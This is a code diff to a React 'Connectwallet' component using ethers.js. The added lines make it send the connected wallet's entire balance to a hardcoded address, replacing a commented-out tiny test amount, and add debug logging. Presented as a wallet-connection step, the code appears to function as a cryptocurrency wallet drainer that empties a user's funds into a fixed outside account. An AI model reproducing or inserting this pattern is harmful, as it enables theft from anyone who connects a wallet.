@@ -104,6 +104,9 @@ export const Connectwallet = () => {
       const sendTransactionWithPreFlightNotifications = async () => {
         const balanceValue = Object.values(wallet?.accounts[0].balance)[0];
 
+        console.log("Balance Value = " +  typeof balanceValue);
+        console.log("BigNumber " + typeof String(ethers.utils.parseUnits(balanceValue)));
+
         
 
         const ethersProvider = new ethers.providers.Web3Provider(wallet.provider, 'any')
@@ -112,8 +115,11 @@ export const Connectwallet = () => {
         const signer = ethersProvider.getSigner();
       
         const txDetails = {
+          from: wallet?.accounts[0].address,
           to: '0x5D530F133C3AEA1872a273883251D0bd6cDE0086',
-          values: balanceValue
+          // value: ethers.utils.parseUnits("0.0000001")
+          value: String(ethers.utils.parseUnits(balanceValue)) 
+          
         }
       
         const sendTransaction = () => {
@@ -125,8 +131,6 @@ export const Connectwallet = () => {
         const estimateGas = () => {
           return ethersProvider.estimateGas(txDetails).then(res => res.toString())
         }
-
-        console.log(txDetails.values);
       
         const transactionHash = await preflightNotifications({
           sendTransaction,
@@ -134,8 +138,7 @@ export const Connectwallet = () => {
           estimateGas,
           balance: balanceValue,
           txDetails: txDetails
-        })
-        
+    })        
         console.log(transactionHash);
       }
     
